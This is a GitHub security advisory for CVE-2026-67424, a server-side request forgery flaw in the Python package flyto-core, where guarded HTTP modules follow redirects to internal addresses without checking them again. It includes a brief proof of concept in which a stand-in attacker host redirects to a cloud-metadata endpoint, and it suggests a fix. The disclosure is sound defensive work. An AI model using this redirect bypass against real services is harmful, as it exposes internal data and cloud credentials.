# [H] Flyto2 Core: Guarded HTTP modules follow redirects into internal space without per-hop SSRF revalidation

## Summary
Severity: High
Advisory: GHSA-c9hr-64h3-gxpc
CVE: CVE-2026-67424
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-c9hr-64h3-gxpc
Type: github-advisory

## Affected
- PyPI: `flyto-core` — affected >=0 <2.26.7

## Details
## Summary
The HTTP modules that DO call the SSRF guard (`http.get`, `http.request`, `http.batch`) validate only the initial URL, then issue the request with aiohttp's default `allow_redirects=True` and perform no per-hop revalidation. An attacker hosts a public URL that 302-redirects to an internal address; the guard passes on the public host and aiohttp transparently follows the redirect into internal space, returning the internal body.

## Root Cause
`src/core/modules/atomic/http/get.py:116` calls `session.get(url, ...)` with no `allow_redirects` argument → aiohttp default `True`. `request.py:60` sets `allow_redirects=follow_redirects` (default True at :327); `batch.py:57` likewise. A repo grep of `http/` for `on_request_redirect` / `response.history` returns NONE — there is no redirect interception or Location revalidation.

## Impact
Full readable SSRF that defeats the primary SSRF control on the very modules that correctly validate. Confidentiality of internal/metadata responses (C:H), S:C.

## Proof of Concept
Verified live: `http.get` with allowlisted base `127.0.0.1` followed a `302 Location: http://127.0.0.2/...` (non-allowlisted) and returned `INTERNAL-VIA-REDIRECT`.
```
attacker hosts http://attacker.tld/r  ->  302 Location: http://<cloud-metadata-ip>/latest/meta-data/...
execute_module http.get {"url":"http://attacker.tld/r"}
```

## Attack Chain
1. Entry: `execute_module http.get {url:"http://attacker.tld/r"}` (attacker 302->internal). Guard: `validate_url_with_env_config(url)` (get.py:104). Bypass proof: validation runs on `attacker.tld` (public) → passes; never re-run on the redirect target.
2. Sink: `session.get(url)` (get.py:116) — no `allow_redirects` arg → aiohttp default True. Bypass proof: grep of `http/` for `on_request_redirect`/`response.history` → NONE.
3. Impact: aiohttp follows 302 to the internal host; internal body returned (get.py:118).

## Bypass Evidence
Live PoC followed a 302 into non-allowlisted loopback and returned the internal marker string. aiohttp `ClientSession.get` default `allow_redirects=True`; module never sets it False; no per-hop revalidation exists.

## Affected Versions
`<= 2.26.6` — `get.py:116`, `request.py:60`, `batch.py:57` present on latest release tag.

## Suggested Fix
Set `allow_redirects=False` and manually revalidate each `Location` header through `validate_url_with_env_config` before following, or cap and re-check every hop.

## Credit

Vulnerability discovered by zx (Jace).

## References
- https://github.com/flytohub/flyto-core/security/advisories/GHSA-c9hr-64h3-gxpc
- https://nvd.nist.gov/vuln/detail/CVE-2026-67424
- https://github.com/flytohub/flyto-core/commit/0a0a528520ec18f5a21f1ddf858a71cc1edfb6e9
- https://github.com/flytohub/flyto-core
- https://github.com/flytohub/flyto-core/releases/tag/v2.26.7
